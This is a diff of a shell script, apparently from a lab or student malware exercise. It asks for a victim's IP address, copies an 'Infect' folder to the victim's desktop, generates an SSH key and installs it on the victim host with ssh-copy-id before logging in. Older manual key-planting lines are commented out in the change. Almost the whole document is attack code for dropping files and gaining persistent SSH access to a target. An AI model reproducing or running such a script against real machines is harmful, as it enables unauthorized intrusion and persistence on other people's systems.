@@ -21,25 +21,25 @@ read -p "Enter Victim IP Address: " IP_Address
 scp -r ./Infect victim@"$IP_Address":/home/victim/Desktop/
 
 # publickey
-SSH_PATH="/root/.ssh"
+SSH_PATH="/home/victim/.ssh" #"/root/.ssh"
 
-mkdir -p "$SSH_PATH"/id_rsa.pub
-mkdir -p "$SSH_PATH"/authorized_keys
+#mkdir -p "$SSH_PATH"/id_rsa.pub
+#mkdir -p "$SSH_PATH"/authorized_keys
 
 #chmod 700 "$SSH_PATH"
 ssh-keygen
 #ssh victim@"$IP_Address" 'mkdir -p "$SSH_PATH";cat >> "$SSH_PATH"/authorized_keys' < "$SSH_PATH"/id_rsa.pub
-#ssh-copy-id victim@"$IP_Address"
-#sh-copy-id -i "$SSH_PATH"/id_rsa.pub victim@"$IP_Address"
+ssh-copy-id victim@"$IP_Address"
+#ssh-copy-id -i "$SSH_PATH"/id_rsa.pub victim@"$IP_Address"
+ssh victim@"$IP_Address"
+
+
+#scp "$SSH_PATH"/id_rsa.pub victim@"$IP_Address":/home/victim/ssh
 #ssh victim@"$IP_Address"
-
-
-sudo scp "$SSH_PATH"/id_rsa.pub victim@"$IP_Address":"$SSH_PATH"
-ssh victim@"$IP_Address"
-cat "$SSH_PATH"/id_rsa.pub >> "$SSH_PATH"/authorized_keys
-chmod 700 "$SSH_PATH"
-chmod 644 "$SSH_PATH"/authorized_keys 
-ll -d "$SSH_PATH"
-ll "$SSH_PATH"/authorized_keys 
-exit
-ssh victim@"$IP_Address"
+#cat "$SSH_PATH"/id_rsa.pub >> "$SSH_PATH"/authorized_keys
+#chmod 700 "$SSH_PATH"
+#chmod 644 "$SSH_PATH"/authorized_keys 
+#ll -d "$SSH_PATH"
+#ll "$SSH_PATH"/authorized_keys 
+#exit
+#ssh victim@"$IP_Address"
